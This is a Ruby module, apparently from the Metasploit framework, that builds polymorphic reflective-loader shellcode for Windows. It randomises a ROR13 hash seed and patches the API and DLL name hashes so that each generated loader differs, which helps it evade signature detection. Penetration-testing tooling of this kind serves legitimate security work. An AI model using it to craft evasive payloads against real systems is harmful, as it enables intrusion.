# -*- coding: binary -*-

###
#
# Shared assembly / patching logic for the polymorphic reflective loader.
# Both the ARCH_X86 and ARCH_X64 loader modules include this module and
# call {#build_reflective_loader} with arch-specific data (GraphML path,
# opcode prefixes, Metasm arch).
#
###
module Msf::Payload::Windows::ReflectiveLoaderCommon

  # Raised by {#build_reflective_loader} when a required opcode pattern is
  # missing from the shuffled reflective-loader assembly (the ROR13 IV mov,
  # a DLL name-hash compare, or a function name-hash compare). Almost always
  # indicates a malformed or out-of-date GraphML template.
  class Error < RuntimeError; end

  # Build the reflective loader shellcode: shuffle the GraphML template,
  # patch the freshly generated ROR13 IV into the two `mov reg, IV`
  # instructions, patch every pre-computed DLL / function name hash to
  # match the new IV, then assemble via Metasm.
  #
  # @param opts [Hash]
  # @option opts [Integer] :iv 32-bit seed for ROR13 hashing (random when omitted)
  # @param arch_config [Hash] arch-specific data supplied by the includer
  # @option arch_config [String] :graphml_path absolute path to the GraphML file
  # @option arch_config [Symbol] :arch ARCH_X86 or ARCH_X64
  # @option arch_config [Class]  :metasm_arch Metasm::X86 or Metasm::X64
  # @option arch_config [Array<String>] :iv_patch_prefixes opcode prefixes of the two `mov reg, IV` instructions that receive the IV
  # @option arch_config [String] :dll_hash_base opcode prefix of the `cmp reg, hash` instruction that matches DLL name hashes
  # @return [String] assembled and patched reflective loader shellcode
  # @raise [Error] if an expected opcode pattern is missing from the shuffled assembly
  def build_reflective_loader(opts, arch_config)
    iv = opts.fetch(:iv) { rand(0x100000000) } & 0xFFFFFFFF

    asm = Rex::Payloads::Shuffle.from_graphml_file(
      arch_config[:graphml_path],
      arch: arch_config[:arch],
      name: 'reflective_loader'
    )

    patch_bytes = lambda { |code, oldbytes, newbytes|
      raise Error, "Failed to patch, opcode: #{oldbytes} not found." unless code.include?(oldbytes)
      code.sub(oldbytes, newbytes)
    }

    to_hashbytes = lambda { |name, nullbyte: false, unicode: false, iv: 0|
      name = name.unpack('C*').pack('v*') if unicode
      fun_hash = Rex::Text.ror13_hash(name + (nullbyte ? "\x00" : ''), iv: iv) & 0xFFFFFFFF
      [fun_hash].pack('V').bytes.map { |b| '0x%02x' % b }.join(', ')
    }

    iv_bytes = [iv].pack('V').bytes.map { |b| '0x%02x' % b }.join(', ')
    arch_config[:iv_patch_prefixes].each do |prefix|
      asm = patch_bytes.call(asm, "#{prefix} 0x00, 0x00, 0x00, 0x00", "#{prefix} #{iv_bytes}")
    end

    vprint_status("Random IV: #{iv}")

    dll_hash_base = arch_config[:dll_hash_base]
    # The static graphml data uses hashes calculated with an IV of 0, so we patch them here using
    # the runtime's random value.
    patches = [
      { base: dll_hash_base, name: 'KERNEL32.DLL',            unicode: true },
      { base: dll_hash_base, name: 'NTDLL.DLL',               unicode: true },
      { base: 'db 0x3d,',    name: 'LoadLibraryA',            count: 2 },
      { base: 'db 0x3d,',    name: 'GetProcAddress' },
      { base: 'db 0x3d,',    name: 'ZwAllocateVirtualMemory', count: 2 },
      { base: 'db 0x3d,',    name: 'ZwProtectVirtualMemory' },
      { base: 'db 0x3d,',    name: 'NtFlushInstructionCache', count: 2 }
    ]

    patches.each do |patch|
      count = patch.fetch(:count) { 1 }
      old_hash = to_hashbytes.call(patch[:name], unicode: patch[:unicode], iv: 0)
      new_hash = to_hashbytes.call(patch[:name], unicode: patch[:unicode], iv: iv)
      count.times do
        vprint_status("Applying patch from #{old_hash} to #{new_hash} for #{patch[:name]}")
        asm = patch_bytes.call(asm, "#{patch[:base]} #{old_hash}", "#{patch[:base]} #{new_hash}")
      end
    end

    code = Metasm::Shellcode.assemble(arch_config[:metasm_arch].new, asm).encode_string
    hash = Rex::Text.md5_raw(code).unpack('H*').first
    vprint_status("Reflective Loader GraphML fingerprint: #{hash}")
    code
  end
end
